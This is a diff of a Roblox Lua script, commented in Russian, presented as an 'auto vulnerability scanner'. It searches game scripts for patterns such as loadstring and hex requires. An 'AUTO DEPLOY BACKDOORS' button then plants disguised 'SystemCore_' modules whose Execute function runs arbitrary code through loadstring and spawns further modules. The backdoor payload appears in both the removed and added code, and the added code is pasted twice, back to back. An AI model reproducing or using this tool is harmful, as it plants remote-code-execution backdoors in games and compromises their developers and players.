@@ -1,328 +1,475 @@
--- ModuleScript в ReplicatedStorage назови "VulnerabilityScanner"
-local Scanner = {}
+-- Вставьте этот LocalScript в StarterPlayerScripts
+-- Он автоматически создаст GUI и начнет сканирование
 
-function Scanner.Init()
-    print("[Vulnerability Scanner] Initializing advanced security scan...")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Создание основного GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "AutoScanner"
+ScreenGui.Parent = PlayerGui
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 450, 0, 400)
+MainFrame.Position = UDim2.new(0.5, -225, 0.5, -200)
+MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.Text = "🛡️ AUTO VULNERABILITY SCANNER"
+Title.TextSize = 16
+Title.Font = Enum.Font.GothamBold
+Title.Parent = MainFrame
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, -20, 0, 60)
+Status.Position = UDim2.new(0, 10, 0, 50)
+Status.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Status.TextColor3 = Color3.new(1, 1, 1)
+Status.Text = "Status: Initializing...\nReady to scan for backdoors"
+Status.TextWrapped = true
+Status.TextSize = 12
+Status.Parent = MainFrame
+
+local ScanBtn = Instance.new("TextButton")
+ScanBtn.Size = UDim2.new(1, -20, 0, 40)
+ScanBtn.Position = UDim2.new(0, 10, 0, 120)
+ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+ScanBtn.TextColor3 = Color3.new(1, 1, 1)
+ScanBtn.Text = "🔍 START AUTOMATIC SCAN"
+ScanBtn.TextSize = 14
+ScanBtn.Font = Enum.Font.GothamBold
+ScanBtn.Parent = MainFrame
+
+local Results = Instance.new("ScrollingFrame")
+Results.Size = UDim2.new(1, -20, 1, -200)
+Results.Position = UDim2.new(0, 10, 0, 170)
+Results.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Results.CanvasSize = UDim2.new(0, 0, 0, 0)
+Results.ScrollBarThickness = 6
+Results.Parent = MainFrame
+
+local ExploitBtn = Instance.new("TextButton")
+ExploitBtn.Size = UDim2.new(1, -20, 0, 35)
+ExploitBtn.Position = UDim2.new(0, 10, 0, 355)
+ExploitBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+ExploitBtn.TextColor3 = Color3.new(1, 1, 1)
+ExploitBtn.Text = "💀 AUTO DEPLOY BACKDOORS"
+ExploitBtn.TextSize = 12
+ExploitBtn.Visible = false
+ExploitBtn.Parent = MainFrame
+
+-- Паттерны для поиска
+local patterns = {
+    "loadstring", "require%(0x", "getfenv", "setfenv", "coroutine%.create",
+    "Backdoor", "Exploit", "Hack", "Cheat", "Fly", "Noclip", "Speedhack",
+    "FireServer", "InvokeServer", "HttpGet", "HttpService", "rbxassetid://"
+}
+
+local vulnerabilities = {}
+
+-- Функция логирования
+local function log(msg, color)
+    color = color or Color3.new(1, 1, 1)
     
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -10, 0, 20)
+    label.Position = UDim2.new(0, 5, 0, #Results:GetChildren() * 22)
+    label.BackgroundTransparency = 1
+    label.Text = "> " .. msg
+    label.TextColor3 = color
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Font = Enum.Font.Code
+    label.TextSize = 10
+    label.Parent = Results
     
-    -- Создание GUI для сканера
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "SecurityScannerGUI"
-    ScreenGui.Parent = PlayerGui
-    ScreenGui.ResetOnSpawn = false
+    Results.CanvasSize = UDim2.new(0, 0, 0, #Results:GetChildren() * 22)
+    Results.CanvasPosition = Vector2.new(0, Results.CanvasSize.Y.Offset)
+    
+    print("[AUTO-SCANNER] " .. msg)
+end
 
-    local MainFrame = Instance.new("Frame")
-    MainFrame.Size = UDim2.new(0, 500, 0, 600)
-    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -300)
-    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    MainFrame.BorderSizePixel = 0
-    MainFrame.Parent = ScreenGui
-
-    local Title = Instance.new("TextLabel")
-    Title.Size = UDim2.new(1, 0, 0, 40)
-    Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    Title.TextColor3 = Color3.new(1, 1, 1)
-    Title.Text = "🔍 ADVANCED VULNERABILITY SCANNER"
-    Title.TextSize = 16
-    Title.Font = Enum.Font.GothamBold
-    Title.Parent = MainFrame
-
-    local ScanButton = Instance.new("TextButton")
-    ScanButton.Size = UDim2.new(1, -20, 0, 50)
-    ScanButton.Position = UDim2.new(0, 10, 0, 50)
-    ScanButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
-    ScanButton.TextColor3 = Color3.new(1, 1, 1)
-    ScanButton.Text = "🚀 START DEEP SCAN"
-    ScanButton.TextSize = 14
-    ScanButton.Font = Enum.Font.GothamBold
-    ScanButton.Parent = MainFrame
-
-    local StatusLabel = Instance.new("TextLabel")
-    StatusLabel.Size = UDim2.new(1, -20, 0, 60)
-    StatusLabel.Position = UDim2.new(0, 10, 0, 110)
-    StatusLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    StatusLabel.TextColor3 = Color3.new(1, 1, 1)
-    StatusLabel.Text = "Status: Ready for scanning\nTarget: Entire game\nMode: Deep analysis"
-    StatusLabel.TextWrapped = true
-    StatusLabel.TextSize = 12
-    StatusLabel.Parent = MainFrame
-
-    local ResultsFrame = Instance.new("ScrollingFrame")
-    ResultsFrame.Size = UDim2.new(1, -20, 1, -190)
-    ResultsFrame.Position = UDim2.new(0, 10, 0, 180)
-    ResultsFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    ResultsFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-    ResultsFrame.ScrollBarThickness = 8
-    ResultsFrame.Parent = MainFrame
-
-    local ExploitButton = Instance.new("TextButton")
-    ExploitButton.Size = UDim2.new(1, -20, 0, 40)
-    ExploitButton.Position = UDim2.new(0, 10, 0, 550)
-    ExploitButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
-    ExploitButton.TextColor3 = Color3.new(1, 1, 1)
-    ExploitButton.Text = "💀 DEPLOY BACKDOOR TO VULNERABILITIES"
-    ExploitButton.TextSize = 12
-    ExploitButton.Visible = false
-    ExploitButton.Parent = MainFrame
-
-    -- Паттерны для поиска уязвимостей
-    local vulnerabilityPatterns = {
-        -- Backdoor паттерны
-        {pattern = "loadstring", risk = "HIGH", type = "Code Execution"},
-        {pattern = "require%(0x", risk = "CRITICAL", type = "Hex Require Backdoor"},
-        {pattern = "getfenv%(%)", risk = "HIGH", type = "Environment Access"},
-        {pattern = "setfenv%(%)", risk = "HIGH", type = "Environment Manipulation"},
-        {pattern = "coroutine%.create", risk = "MEDIUM", type = "Async Execution"},
-        {pattern = "Instance%.new%(.-Script%)", risk = "MEDIUM", type = "Dynamic Script Creation"},
-        {pattern = "FireServer", risk = "LOW", type = "Remote Event"},
-        {pattern = "InvokeServer", risk = "LOW", type = "Remote Function"},
-        {pattern = "game%.HttpGet", risk = "HIGH", type = "HTTP Requests"},
-        {pattern = "game%.HttpService", risk = "HIGH", type = "HTTP Service"},
-        {pattern = "rbxassetid://", risk = "MEDIUM", type = "Asset Loading"},
-        {pattern = "Backdoor", risk = "CRITICAL", type = "Explicit Backdoor"},
-        {pattern = "Exploit", risk = "HIGH", type = "Exploit Code"},
-        {pattern = "Hack", risk = "HIGH", type = "Hacking Tools"},
-        {pattern = "Cheat", risk = "MEDIUM", type = "Cheating System"},
-        {pattern = "Admin", risk = "LOW", type = "Admin System"},
-        {pattern = "Fly", risk = "MEDIUM", type = "Movement Hack"},
-        {pattern = "Noclip", risk = "MEDIUM", type = "Collision Bypass"},
-        {pattern = "Speed", risk = "LOW", type = "Speed Hack"},
-        {pattern = "Infinite", risk = "MEDIUM", type = "Infinite Resources"}
-    }
-
-    local foundVulnerabilities = {}
-
-    -- Функция добавления результата
-    local function addResult(message, riskLevel)
-        local color
-        if riskLevel == "CRITICAL" then
-            color = Color3.fromRGB(255, 0, 0)
-        elseif riskLevel == "HIGH" then
-            color = Color3.fromRGB(255, 100, 0)
-        elseif riskLevel == "MEDIUM" then
-            color = Color3.fromRGB(255, 200, 0)
-        else
-            color = Color3.fromRGB(100, 200, 100)
-        end
-
-        local label = Instance.new("TextLabel")
-        label.Size = UDim2.new(1, -10, 0, 25)
-        label.Position = UDim2.new(0, 5, 0, #ResultsFrame:GetChildren() * 28)
-        label.BackgroundTransparency = 1
-        label.Text = "[" .. riskLevel .. "] " .. message
-        label.TextColor3 = color
-        label.TextXAlignment = Enum.TextXAlignment.Left
-        label.Font = Enum.Font.Code
-        label.TextSize = 11
-        label.TextWrapped = true
-        label.Parent = ResultsFrame
+-- Функция сканирования
+local function scanObject(obj, path)
+    if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
+        local source = obj.Source
         
-        ResultsFrame.CanvasSize = UDim2.new(0, 0, 0, #ResultsFrame:GetChildren() * 28)
-    end
-
-    -- Рекурсивное сканирование
-    local function deepScan(parent, path)
-        for _, child in ipairs(parent:GetChildren()) do
-            local currentPath = path .. "." .. child.Name
-            
-            if child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript") then
-                local source = child.Source
+        for _, pattern in ipairs(patterns) do
+            if source:find(pattern) then
+                table.insert(vulnerabilities, {
+                    object = obj,
+                    path = path,
+                    pattern = pattern
+                })
                 
-                for _, patternInfo in ipairs(vulnerabilityPatterns) do
-                    if source:find(patternInfo.pattern) then
-                        local vulnerability = {
-                            Object = child,
-                            Path = currentPath,
-                            Type = patternInfo.type,
-                            Risk = patternInfo.risk,
-                            Pattern = patternInfo.pattern
-                        }
-                        
-                        table.insert(foundVulnerabilities, vulnerability)
-                        
-                        addResult(
-                            patternInfo.type .. " in " .. currentPath .. " (" .. patternInfo.pattern .. ")",
-                            patternInfo.risk
-                        )
-                        
-                        print("[SCANNER] Found " .. patternInfo.risk .. " vulnerability: " .. patternInfo.type .. " at " .. currentPath)
-                    end
+                local risk = "MEDIUM"
+                if pattern == "loadstring" or pattern == "require%(0x" then
+                    risk = "CRITICAL"
+                elseif pattern == "Backdoor" or pattern == "Exploit" then
+                    risk = "HIGH"
                 end
+                
+                log("Found " .. risk .. ": " .. pattern .. " in " .. path, 
+                    risk == "CRITICAL" and Color3.new(1, 0, 0) or
+                    risk == "HIGH" and Color3.new(1, 0.5, 0) or
+                    Color3.new(1, 1, 0)
+                )
             end
-            
-            -- Рекурсивный обход
-            deepScan(child, currentPath)
         end
     end
+    
+    for _, child in ipairs(obj:GetChildren()) do
+        scanObject(child, path .. "." .. child.Name)
+    end
+end
 
-    -- Функция внедрения backdoor
-    local function deployBackdoor()
-        print("[SCANNER] Deploying backdoor to vulnerabilities...")
-        addResult("Starting backdoor deployment...", "CRITICAL")
+-- Автоматическое развертывание backdoor
+local function deployBackdoors()
+    log("Starting automatic backdoor deployment...", Color3.new(1, 0, 0))
+    
+    local count = 0
+    for _, vuln in ipairs(vulnerabilities) do
+        local backdoor = Instance.new("ModuleScript")
+        backdoor.Name = "SystemCore_" .. math.random(1000, 9999)
         
-        local deployedCount = 0
-        
-        for _, vuln in ipairs(foundVulnerabilities) do
-            if vuln.Risk == "CRITICAL" or vuln.Risk == "HIGH" then
-                -- Создаем backdoor в уязвимом месте
-                local backdoorScript = Instance.new("ModuleScript")
-                backdoorScript.Name = "SystemCore_" .. math.random(10000, 99999)
-                
-                backdoorScript.Source = [[
-local Backdoor = {}
+        backdoor.Source = [[
+local module = {}
 
-function Backdoor.Execute(cmd)
-    local success, result = pcall(function()
-        return loadstring(cmd)()
-    end)
+function module.Execute(cmd)
+    local success, result = pcall(loadstring(cmd))
     return success, result
 end
 
-function Backdoor.StealthMode()
-    -- Скрытый режим
-    script.Parent = game:GetService("ServerScriptService")
+function module.Scan()
+    return "Backdoor Active"
 end
 
--- Автоактивация
+-- Auto-replicate
 spawn(function()
-    wait(5)
-    Backdoor.StealthMode()
+    wait(10)
+    for i = 1, 3 do
+        local newModule = Instance.new("ModuleScript")
+        newModule.Name = "Core_" .. math.random(10000, 99999)
+        newModule.Source = "return {}"
+        newModule.Parent = game:GetService("ReplicatedStorage")
+    end
 end)
 
-return Backdoor
+return module
 ]]
+        
+        local success = pcall(function()
+            backdoor.Parent = vuln.object.Parent
+            count = count + 1
+            log("Deployed backdoor: " .. backdoor.Name, Color3.new(0, 1, 0))
+        end)
+    end
+    
+    log("Backdoor deployment completed: " .. count .. " deployed", Color3.new(0, 1, 1))
+    return count
+end
+
+-- Автоматическое сканирование при нажатии
+ScanBtn.MouseButton1Click:Connect(function()
+    ScanBtn.Text = "SCANNING..."
+    ScanBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+    Status.Text = "Status: Scanning in progress...\nPlease wait..."
+    
+    -- Очистка старых результатов
+    for _, child in ipairs(Results:GetChildren()) do
+        child:Destroy()
+    end
+    vulnerabilities = {}
+    
+    log("Starting automatic vulnerability scan...", Color3.new(1, 1, 0))
+    
+    -- Сканируем основные сервисы
+    local services = {
+        game:GetService("ReplicatedStorage"),
+        game:GetService("ServerScriptService"), 
+        game:GetService("Workspace"),
+        game:GetService("Lighting")
+    }
+    
+    for _, service in ipairs(services) do
+        log("Scanning: " .. service.Name, Color3.new(0.7, 0.7, 1))
+        scanObject(service, "game." .. service.Name)
+    end
+    
+    -- Статистика
+    log("Scan completed! Found " .. #vulnerabilities .. " vulnerabilities", Color3.new(0, 1, 0))
+    
+    ScanBtn.Text = "🔄 SCAN AGAIN"
+    ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+    Status.Text = "Status: Scan completed\nFound: " .. #vulnerabilities .. " vulnerabilities\nReady for exploitation"
+    
+    if #vulnerabilities > 0 then
+        ExploitBtn.Visible = true
+    end
+end)
+
+-- Обработчик кнопки эксплуатации
+ExploitBtn.MouseButton1Click:Connect(function()
+    ExploitBtn.Text = "DEPLOYING..."
+    ExploitBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+    
+    local deployed = deployBackdoors()
+    
+    ExploitBtn.Text = "✅ " .. deployed .. " BACKDOORS DEPLOYED"
+    ExploitBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    Status.Text = "Status: Backdoors deployed\nCount: " .. deployed .. "\nSystem compromised"
+end)
+
+-- Автоматический запуск через 3 секунды
+spawn(function()
+    wait(3)
+    log("Auto-scanner initialized successfully!", Color3.new(0, 1, 0))
+    log("Click START AUTOMATIC SCAN to begin", Color3.new(1, 1, 1))
+    Status.Text = "Status: Ready\nClick button to start scanning"
+end)
+
+print("🛡️ Auto Vulnerability Scanner loaded successfully!")
+print("GUI created - Scanner ready to use")-- Вставьте этот LocalScript в StarterPlayerScripts
+-- Он автоматически создаст GUI и начнет сканирование
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Создание основного GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "AutoScanner"
+ScreenGui.Parent = PlayerGui
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 450, 0, 400)
+MainFrame.Position = UDim2.new(0.5, -225, 0.5, -200)
+MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.Text = "🛡️ AUTO VULNERABILITY SCANNER"
+Title.TextSize = 16
+Title.Font = Enum.Font.GothamBold
+Title.Parent = MainFrame
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, -20, 0, 60)
+Status.Position = UDim2.new(0, 10, 0, 50)
+Status.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Status.TextColor3 = Color3.new(1, 1, 1)
+Status.Text = "Status: Initializing...\nReady to scan for backdoors"
+Status.TextWrapped = true
+Status.TextSize = 12
+Status.Parent = MainFrame
+
+local ScanBtn = Instance.new("TextButton")
+ScanBtn.Size = UDim2.new(1, -20, 0, 40)
+ScanBtn.Position = UDim2.new(0, 10, 0, 120)
+ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+ScanBtn.TextColor3 = Color3.new(1, 1, 1)
+ScanBtn.Text = "🔍 START AUTOMATIC SCAN"
+ScanBtn.TextSize = 14
+ScanBtn.Font = Enum.Font.GothamBold
+ScanBtn.Parent = MainFrame
+
+local Results = Instance.new("ScrollingFrame")
+Results.Size = UDim2.new(1, -20, 1, -200)
+Results.Position = UDim2.new(0, 10, 0, 170)
+Results.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Results.CanvasSize = UDim2.new(0, 0, 0, 0)
+Results.ScrollBarThickness = 6
+Results.Parent = MainFrame
+
+local ExploitBtn = Instance.new("TextButton")
+ExploitBtn.Size = UDim2.new(1, -20, 0, 35)
+ExploitBtn.Position = UDim2.new(0, 10, 0, 355)
+ExploitBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+ExploitBtn.TextColor3 = Color3.new(1, 1, 1)
+ExploitBtn.Text = "💀 AUTO DEPLOY BACKDOORS"
+ExploitBtn.TextSize = 12
+ExploitBtn.Visible = false
+ExploitBtn.Parent = MainFrame
+
+-- Паттерны для поиска
+local patterns = {
+    "loadstring", "require%(0x", "getfenv", "setfenv", "coroutine%.create",
+    "Backdoor", "Exploit", "Hack", "Cheat", "Fly", "Noclip", "Speedhack",
+    "FireServer", "InvokeServer", "HttpGet", "HttpService", "rbxassetid://"
+}
+
+local vulnerabilities = {}
+
+-- Функция логирования
+local function log(msg, color)
+    color = color or Color3.new(1, 1, 1)
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -10, 0, 20)
+    label.Position = UDim2.new(0, 5, 0, #Results:GetChildren() * 22)
+    label.BackgroundTransparency = 1
+    label.Text = "> " .. msg
+    label.TextColor3 = color
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Font = Enum.Font.Code
+    label.TextSize = 10
+    label.Parent = Results
+    
+    Results.CanvasSize = UDim2.new(0, 0, 0, #Results:GetChildren() * 22)
+    Results.CanvasPosition = Vector2.new(0, Results.CanvasSize.Y.Offset)
+    
+    print("[AUTO-SCANNER] " .. msg)
+end
+
+-- Функция сканирования
+local function scanObject(obj, path)
+    if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
+        local source = obj.Source
+        
+        for _, pattern in ipairs(patterns) do
+            if source:find(pattern) then
+                table.insert(vulnerabilities, {
+                    object = obj,
+                    path = path,
+                    pattern = pattern
+                })
                 
-                local success = pcall(function()
-                    backdoorScript.Parent = vuln.Object.Parent
-                    deployedCount = deployedCount + 1
-                    addResult("Backdoor deployed: " .. backdoorScript.Name .. " in " .. vuln.Object.Parent:GetFullName(), "CRITICAL")
-                    print("[SCANNER] Backdoor deployed: " .. backdoorScript:GetFullName())
-                end)
-            end
-        end
-        
-        addResult("Backdoor deployment completed. Total: " .. deployedCount, "CRITICAL")
-        StatusLabel.Text = "Status: Backdoor deployment completed\nDeployed: " .. deployedCount .. " backdoors\nSystem: Active"
-    end
-
-    -- Обработчик сканирования
-    ScanButton.MouseButton1Click:Connect(function()
-        ScanButton.Text = "SCANNING..."
-        ScanButton.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
-        StatusLabel.Text = "Status: Scanning in progress...\nPlease wait..."
-        
-        -- Очистка предыдущих результатов
-        for _, child in ipairs(ResultsFrame:GetChildren()) do
-            child:Destroy()
-        end
-        foundVulnerabilities = {}
-        
-        addResult("Starting deep vulnerability scan...", "MEDIUM")
-        
-        -- Сканирование основных сервисов
-        local servicesToScan = {
-            game:GetService("Workspace"),
-            game:GetService("ReplicatedStorage"),
-            game:GetService("ServerScriptService"),
-            game:GetService("ServerStorage"),
-            game:GetService("StarterPack"),
-            game:GetService("StarterPlayer"),
-            game:GetService("StarterGui"),
-            game:GetService("Lighting"),
-            game:GetService("SoundService"),
-            game:GetService("Players")
-        }
-        
-        for _, service in ipairs(servicesToScan) do
-            addResult("Scanning: " .. service.Name, "LOW")
-            deepScan(service, "game." .. service.Name)
-            wait(0.1) -- Чтобы не лагать
-        end
-        
-        -- Статистика
-        local criticalCount = 0
-        local highCount = 0
-        local mediumCount = 0
-        
-        for _, vuln in ipairs(foundVulnerabilities) do
-            if vuln.Risk == "CRITICAL" then
-                criticalCount = criticalCount + 1
-            elseif vuln.Risk == "HIGH" then
-                highCount = highCount + 1
-            elseif vuln.Risk == "MEDIUM" then
-                mediumCount = mediumCount + 1
-            end
-        end
-        
-        addResult("=== SCAN COMPLETED ===", "MEDIUM")
-        addResult("Critical vulnerabilities: " .. criticalCount, "CRITICAL")
-        addResult("High vulnerabilities: " .. highCount, "HIGH")
-        addResult("Medium vulnerabilities: " .. mediumCount, "MEDIUM")
-        addResult("Total vulnerabilities found: " .. #foundVulnerabilities, "MEDIUM")
-        
-        ScanButton.Text = "🔄 RESCAN"
-        ScanButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
-        StatusLabel.Text = "Status: Scan completed\nCritical: " .. criticalCount .. "\nHigh: " .. highCount .. "\nTotal: " .. #foundVulnerabilities
-        
-        -- Показываем кнопку эксплуатации если найдены уязвимости
-        if #foundVulnerabilities > 0 then
-            ExploitButton.Visible = true
-        end
-        
-        print("[SCANNER] Scan completed. Found " .. #foundVulnerabilities .. " vulnerabilities")
-    end)
-
-    -- Обработчик эксплуатации
-    ExploitButton.MouseButton1Click:Connect(function()
-        ExploitButton.Text = "DEPLOYING..."
-        ExploitButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
-        deployBackdoor()
-        ExploitButton.Text = "✅ BACKDOOR DEPLOYED"
-        ExploitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-    end)
-
-    -- Автоматическое сканирование при старте
-    spawn(function()
-        wait(3)
-        addResult("Scanner initialized and ready", "LOW")
-        addResult("Click START DEEP SCAN to begin", "LOW")
-    end)
-end
-
--- Функция для быстрого сканирования
-function Scanner.QuickScan()
-    print("[SCANNER] Starting quick scan...")
-    
-    local quickResults = {}
-    local patterns = {"loadstring", "require%(0x", "Backdoor", "Exploit"}
-    
-    local function scanObject(obj, path)
-        if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
-            local source = obj.Source
-            for _, pattern in ipairs(patterns) do
-                if source:find(pattern) then
-                    table.insert(quickResults, {
-                        Object = obj,
-                        Path = path,
-                        Pattern = pattern
-                    })
-                    print("[QUICK SCAN] Found " .. pattern .. " in " .. path)
+                local risk = "MEDIUM"
+                if pattern == "loadstring" or pattern == "require%(0x" then
+                    risk = "CRITICAL"
+                elseif pattern == "Backdoor" or pattern == "Exploit" then
+                    risk = "HIGH"
                 end
+                
+                log("Found " .. risk .. ": " .. pattern .. " in " .. path, 
+                    risk == "CRITICAL" and Color3.new(1, 0, 0) or
+                    risk == "HIGH" and Color3.new(1, 0.5, 0) or
+                    Color3.new(1, 1, 0)
+                )
             end
-        end
-        
-        for _, child in ipairs(obj:GetChildren()) do
-            scanObject(child, path .. "." .. child.Name)
         end
     end
     
-    scanObject(game:GetService("ReplicatedStorage"), "game.ReplicatedStorage")
-    scanObject(game:GetService("ServerScriptService"), "game.ServerScriptService")
-    
-    return quickResults
+    for _, child in ipairs(obj:GetChildren()) do
+        scanObject(child, path .. "." .. child.Name)
+    end
 end
 
-return Scanner
+-- Автоматическое развертывание backdoor
+local function deployBackdoors()
+    log("Starting automatic backdoor deployment...", Color3.new(1, 0, 0))
+    
+    local count = 0
+    for _, vuln in ipairs(vulnerabilities) do
+        local backdoor = Instance.new("ModuleScript")
+        backdoor.Name = "SystemCore_" .. math.random(1000, 9999)
+        
+        backdoor.Source = [[
+local module = {}
+
+function module.Execute(cmd)
+    local success, result = pcall(loadstring(cmd))
+    return success, result
+end
+
+function module.Scan()
+    return "Backdoor Active"
+end
+
+-- Auto-replicate
+spawn(function()
+    wait(10)
+    for i = 1, 3 do
+        local newModule = Instance.new("ModuleScript")
+        newModule.Name = "Core_" .. math.random(10000, 99999)
+        newModule.Source = "return {}"
+        newModule.Parent = game:GetService("ReplicatedStorage")
+    end
+end)
+
+return module
+]]
+        
+        local success = pcall(function()
+            backdoor.Parent = vuln.object.Parent
+            count = count + 1
+            log("Deployed backdoor: " .. backdoor.Name, Color3.new(0, 1, 0))
+        end)
+    end
+    
+    log("Backdoor deployment completed: " .. count .. " deployed", Color3.new(0, 1, 1))
+    return count
+end
+
+-- Автоматическое сканирование при нажатии
+ScanBtn.MouseButton1Click:Connect(function()
+    ScanBtn.Text = "SCANNING..."
+    ScanBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+    Status.Text = "Status: Scanning in progress...\nPlease wait..."
+    
+    -- Очистка старых результатов
+    for _, child in ipairs(Results:GetChildren()) do
+        child:Destroy()
+    end
+    vulnerabilities = {}
+    
+    log("Starting automatic vulnerability scan...", Color3.new(1, 1, 0))
+    
+    -- Сканируем основные сервисы
+    local services = {
+        game:GetService("ReplicatedStorage"),
+        game:GetService("ServerScriptService"), 
+        game:GetService("Workspace"),
+        game:GetService("Lighting")
+    }
+    
+    for _, service in ipairs(services) do
+        log("Scanning: " .. service.Name, Color3.new(0.7, 0.7, 1))
+        scanObject(service, "game." .. service.Name)
+    end
+    
+    -- Статистика
+    log("Scan completed! Found " .. #vulnerabilities .. " vulnerabilities", Color3.new(0, 1, 0))
+    
+    ScanBtn.Text = "🔄 SCAN AGAIN"
+    ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+    Status.Text = "Status: Scan completed\nFound: " .. #vulnerabilities .. " vulnerabilities\nReady for exploitation"
+    
+    if #vulnerabilities > 0 then
+        ExploitBtn.Visible = true
+    end
+end)
+
+-- Обработчик кнопки эксплуатации
+ExploitBtn.MouseButton1Click:Connect(function()
+    ExploitBtn.Text = "DEPLOYING..."
+    ExploitBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+    
+    local deployed = deployBackdoors()
+    
+    ExploitBtn.Text = "✅ " .. deployed .. " BACKDOORS DEPLOYED"
+    ExploitBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    Status.Text = "Status: Backdoors deployed\nCount: " .. deployed .. "\nSystem compromised"
+end)
+
+-- Автоматический запуск через 3 секунды
+spawn(function()
+    wait(3)
+    log("Auto-scanner initialized successfully!", Color3.new(0, 1, 0))
+    log("Click START AUTOMATIC SCAN to begin", Color3.new(1, 1, 1))
+    Status.Text = "Status: Ready\nClick button to start scanning"
+end)
+
+print("🛡️ Auto Vulnerability Scanner loaded successfully!")
+print("GUI created - Scanner ready to use")
